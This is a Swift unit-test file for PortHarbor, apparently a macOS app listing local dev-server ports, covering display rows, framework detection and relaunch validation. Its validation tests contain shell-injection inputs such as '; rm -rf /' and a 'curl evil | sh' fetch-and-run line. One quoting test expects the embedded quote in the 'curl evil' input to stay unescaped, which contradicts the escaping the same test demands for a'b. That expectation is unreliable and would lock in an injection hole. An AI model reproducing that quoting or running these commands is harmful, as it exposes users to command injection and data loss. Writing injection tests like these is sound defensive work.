import XCTest
@testable import PortHarbor

final class ListenerRowTests: XCTestCase {
    private func row(
        port: Int = 3000,
        pid: Int = 4242,
        processName: String = "node",
        fullCommand: String = "/opt/homebrew/bin/node /p/node_modules/.bin/vite dev",
        cwd: String? = "/Users/me/project",
        framework: Framework = .vite,
        projectName: String? = "project"
    ) -> ListenerRow {
        ListenerRow(
            port: port,
            pid: pid,
            processName: processName,
            fullCommand: fullCommand,
            cwd: cwd,
            framework: framework,
            projectName: projectName,
            canRelaunch: Actions.canRelaunch(fullCommand: fullCommand)
        )
    }

    func testWorkingDirectory_treatsRootAndEmptyAsAbsent() {
        XCTAssertEqual(row(cwd: "/Users/me/project").workingDirectory, "/Users/me/project")
        // App bundles report `/` as their cwd; opening it in an editor is never
        // what the user meant.
        XCTAssertNil(row(cwd: "/").workingDirectory)
        XCTAssertNil(row(cwd: "").workingDirectory)
        XCTAssertNil(row(cwd: nil).workingDirectory)
    }

    func testStopConfirmation_skippedForRecognizedDevServers() {
        XCTAssertFalse(row().needsStopConfirmation)
    }

    func testStopConfirmation_requiredForUnrecognizedProcesses() {
        let appBundle = row(
            port: 7265,
            processName: "Raycast",
            fullCommand: "/Applications/Raycast.app/Contents/MacOS/Raycast",
            cwd: "/",
            framework: .unknown,
            projectName: nil
        )
        XCTAssertTrue(appBundle.needsStopConfirmation)
    }

    func testStopConfirmation_skippedForKnownBinaryWithoutDirectory() {
        // A bare `node` process with no reported cwd is still recognizably a
        // dev runtime, so it should not nag.
        let bare = row(fullCommand: "node server.js", cwd: nil, framework: .node, projectName: nil)
        XCTAssertFalse(bare.needsStopConfirmation)
    }

    func testDisplayTitle_fallsBackToPort() {
        XCTAssertEqual(row(projectName: nil).displayTitle, "localhost:3000")
        XCTAssertEqual(row(projectName: "shop").displayTitle, "shop")
    }
}

final class FrameworkTests: XCTestCase {
    func testUnknownHasNoLabelAndNoBadge() {
        XCTAssertNil(Framework.unknown.label)
        XCTAssertNil(Framework.unknown.monogram)
    }

    func testKnownFrameworksHaveLabelAndMonogram() {
        for framework in Framework.allCases where framework != .unknown {
            XCTAssertNotNil(framework.label, "\(framework) should have a label")
            XCTAssertNotNil(framework.monogram, "\(framework) should have a monogram")
            XCTAssertFalse(framework.monogram!.isEmpty)
        }
    }

    func testSubtitle_omitsUnknownFrameworkAndPID() {
        let subtitle = FrameworkDetector.subtitle(
            framework: .unknown,
            fullCommand: "/Applications/Raycast.app/Contents/MacOS/Raycast"
        )
        XCTAssertFalse(subtitle.contains("Unknown"))
        XCTAssertFalse(subtitle.contains("Server"))
        // The PID gets its own slot in the row, because the subtitle truncates.
        XCTAssertFalse(subtitle.contains("PID"))
    }

    func testSubtitle_leadsWithFrameworkWhenKnown() {
        let subtitle = FrameworkDetector.subtitle(framework: .vite, fullCommand: "node vite dev")
        XCTAssertTrue(subtitle.hasPrefix("Vite · "))
    }
}

final class ActionsValidationTests: XCTestCase {
    func testKnownDevBinaryDetection() {
        XCTAssertTrue(Actions.isKnownDevBinary(fullCommand: "/opt/homebrew/bin/node server.js"))
        XCTAssertTrue(Actions.isKnownDevBinary(fullCommand: "npm run dev"))
        XCTAssertFalse(Actions.isKnownDevBinary(fullCommand: "/Applications/Spotify.app/Contents/MacOS/Spotify"))
    }

    func testCanRelaunch_rejectsEmptyCommand() {
        XCTAssertFalse(Actions.canRelaunch(fullCommand: "   "))
    }

    func testCanRelaunch_rejectsMetacharactersFromUntrustedBinaries() {
        XCTAssertFalse(Actions.canRelaunch(fullCommand: "/Applications/Foo.app/Contents/MacOS/Foo; rm -rf /"))
    }

    func testCanRelaunch_rejectsMetacharactersOnSystemPrefixNonDevBinary() {
        // Absolute /bin paths alone no longer skip the metacharacter filter.
        XCTAssertFalse(Actions.canRelaunch(fullCommand: "/bin/echo hello; rm -rf /tmp/x"))
    }

    func testCanRelaunch_acceptsAbsoluteDevCommand() {
        XCTAssertTrue(Actions.canRelaunch(fullCommand: "/bin/sh -c true"))
    }

    func testCanRelaunch_resolvesBareExecutableWithoutSpawningWhich() {
        // Layout used to call `which` via Process for every row; PATH lookup
        // on disk must be enough for a binary that is always present.
        XCTAssertTrue(Actions.canRelaunch(fullCommand: "sh -c true"))
    }

    func testShellSingleQuoted_escapesEmbeddedQuotes() {
        XCTAssertEqual(Actions.shellSingleQuoted("/tmp/ok"), "'/tmp/ok'")
        XCTAssertEqual(
            Actions.shellSingleQuoted("/tmp/pwn'; curl evil | sh"),
            "'/tmp/pwn'; curl evil | sh'"
        )
        XCTAssertEqual(Actions.shellSingleQuoted("a'b"), "'a'\\''b'")
    }

    func testPasteableShellCommand_quotesEachArgument() {
        let pasteable = Actions.pasteableShellCommand(
            "/opt/homebrew/bin/node /tmp/pwn; id /app.js"
        )
        XCTAssertEqual(
            pasteable,
            "'/opt/homebrew/bin/node' '/tmp/pwn;' 'id' '/app.js'"
        )
    }

    func testIdentityKey_usesExecutableAndFirstArgBasenames() {
        let a = Actions.identityKey(for: "/opt/homebrew/bin/node /Users/me/app/server.js")
        let b = Actions.identityKey(for: "/usr/local/bin/node /elsewhere/server.js")
        let c = Actions.identityKey(for: "/opt/homebrew/bin/node /Users/me/app/other.js")
        XCTAssertEqual(a, b)
        XCTAssertNotEqual(a, c)
    }
}

final class ScanFreezePolicyTests: XCTestCase {
    func testHoldWhilePointerInsideWithinWindow() {
        let start = Date(timeIntervalSince1970: 1_000)
        XCTAssertTrue(
            PortsStore.shouldHoldScanUpdate(
                isPointerInside: true,
                frozenSince: start,
                now: start.addingTimeInterval(5),
                maxFreeze: 12
            )
        )
    }

    func testReleaseAfterMaxFreezeEvenIfPointerInside() {
        let start = Date(timeIntervalSince1970: 1_000)
        XCTAssertFalse(
            PortsStore.shouldHoldScanUpdate(
                isPointerInside: true,
                frozenSince: start,
                now: start.addingTimeInterval(13),
                maxFreeze: 12
            )
        )
    }

    func testNoHoldWhenPointerOutside() {
        XCTAssertFalse(
            PortsStore.shouldHoldScanUpdate(
                isPointerInside: false,
                frozenSince: Date(),
                now: Date(),
                maxFreeze: 12
            )
        )
    }
}

final class FrameworkDetectionTests: XCTestCase {
    func testDetectsSanityStudio() {
        XCTAssertEqual(
            FrameworkDetector.detect(from: "/opt/homebrew/bin/node /p/node_modules/.bin/sanity dev"),
            .sanity
        )
        XCTAssertEqual(
            FrameworkDetector.detect(from: "npx sanity start"),
            .sanity
        )
    }

    func testDetectsAstro() {
        XCTAssertEqual(
            FrameworkDetector.detect(from: "/opt/homebrew/bin/node /p/node_modules/astro/astro.js dev"),
            .astro
        )
    }

    func testDetectsNextAndViteFromRealCommandShapes() {
        XCTAssertEqual(
            FrameworkDetector.detect(from: "/opt/homebrew/bin/node /p/node_modules/next/dist/server/lib/start-server.js"),
            .nextjs
        )
        XCTAssertEqual(
            FrameworkDetector.detect(from: "/opt/homebrew/bin/node /p/node_modules/.bin/vite"),
            .vite
        )
        XCTAssertEqual(
            FrameworkDetector.detect(from: "npm run dev"),
            .node
        )
    }

    func testDoesNotTreatPathSubstringAsFramework() {
        // A folder named "next-app" must not become Next.js.
        XCTAssertEqual(
            FrameworkDetector.detect(from: "/opt/homebrew/bin/node /Users/me/next-app/server.js"),
            .node
        )
        XCTAssertEqual(
            FrameworkDetector.detect(from: "/opt/homebrew/bin/node /Users/me/myvite/index.js"),
            .node
        )
    }

    func testExpressRequiresExpressTokenNotBareServer() {
        XCTAssertEqual(
            FrameworkDetector.detect(from: "node ./server.js"),
            .node
        )
        XCTAssertEqual(
            FrameworkDetector.detect(from: "node /p/node_modules/express/lib/express.js"),
            .express
        )
    }

    func testMentionsRequiresTokenBoundaries() {
        XCTAssertTrue(FrameworkDetector.mentions("/p/node_modules/vite/bin/vite.js", "vite"))
        XCTAssertFalse(FrameworkDetector.mentions("/Users/me/myvite/app.js", "vite"))
        XCTAssertTrue(FrameworkDetector.hasPhrase("next dev", "next dev"))
    }
}

@MainActor
final class IgnoreStoreTests: XCTestCase {
    private var defaults: UserDefaults!
    private var suiteName: String!

    override func setUp() {
        super.setUp()
        suiteName = "PortHarborTests.\(UUID().uuidString)"
        defaults = UserDefaults(suiteName: suiteName)
    }

    override func tearDown() {
        defaults.removePersistentDomain(forName: suiteName)
        super.tearDown()
    }

    func testIgnoreAndUnignore() {
        let store = IgnoreStore(defaults: defaults)
        XCTAssertFalse(store.isIgnored("Raycast"))

        store.ignore("Raycast")
        XCTAssertTrue(store.isIgnored("Raycast"))
        XCTAssertEqual(store.ignoredNames, ["Raycast"])

        store.unignore("Raycast")
        XCTAssertFalse(store.isIgnored("Raycast"))
        XCTAssertTrue(store.ignoredNames.isEmpty)
    }

    func testMatchingIsCaseInsensitiveButDisplayKeepsOriginal() {
        let store = IgnoreStore(defaults: defaults)
        store.ignore("Spotify")

        XCTAssertTrue(store.isIgnored("spotify"))
        XCTAssertTrue(store.isIgnored("  SPOTIFY "))
        XCTAssertEqual(store.ignoredNames, ["Spotify"])

        // Re-ignoring a case variant must not create a duplicate entry.
        store.ignore("spotify")
        XCTAssertEqual(store.ignoredNames, ["Spotify"])
    }

    func testIgnoringBlankNameIsANoop() {
        let store = IgnoreStore(defaults: defaults)
        store.ignore("   ")
        XCTAssertTrue(store.ignoredNames.isEmpty)
    }

    func testPersistsAcrossInstances() {
        let store = IgnoreStore(defaults: defaults)
        store.ignore("Raycast")
        store.ignore("Spotify")

        let reloaded = IgnoreStore(defaults: defaults)
        XCTAssertEqual(reloaded.ignoredNames, ["Raycast", "Spotify"])
        XCTAssertTrue(reloaded.isIgnored("raycast"))
    }

    func testUnignoreAll() {
        let store = IgnoreStore(defaults: defaults)
        store.ignore("Raycast")
        store.ignore("Spotify")
        store.unignoreAll()

        XCTAssertTrue(store.ignoredNames.isEmpty)
        XCTAssertTrue(IgnoreStore(defaults: defaults).ignoredNames.isEmpty)
    }

    func testNamesAreSortedForDisplay() {
        let store = IgnoreStore(defaults: defaults)
        store.ignore("zed")
        store.ignore("Raycast")
        store.ignore("spotify")
        XCTAssertEqual(store.ignoredNames, ["Raycast", "spotify", "zed"])
    }
}
